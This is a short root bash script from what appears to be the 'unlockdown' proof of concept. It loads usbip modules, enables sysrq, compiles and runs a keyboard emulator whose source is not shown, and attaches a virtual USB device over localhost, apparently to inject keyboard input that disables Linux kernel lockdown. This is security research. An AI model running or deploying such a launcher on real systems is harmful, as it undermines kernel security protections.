#!/bin/bash
# 
# https://github.com/xairy/unlockdown
#
# Andrey Konovalov <andreyknvl@gmail.com>

set -eux

apt-get install linux-tools-`uname -r` linux-modules-extra-`uname -r`

modprobe vhci_hcd
modprobe usbip_core

echo 1 > /proc/sys/kernel/sysrq

gcc keyboard.c -o keyboard
./keyboard &
usbip attach -r 127.0.0.1 -b 1-1

sleep 3

echo "Done! Check dmesg."
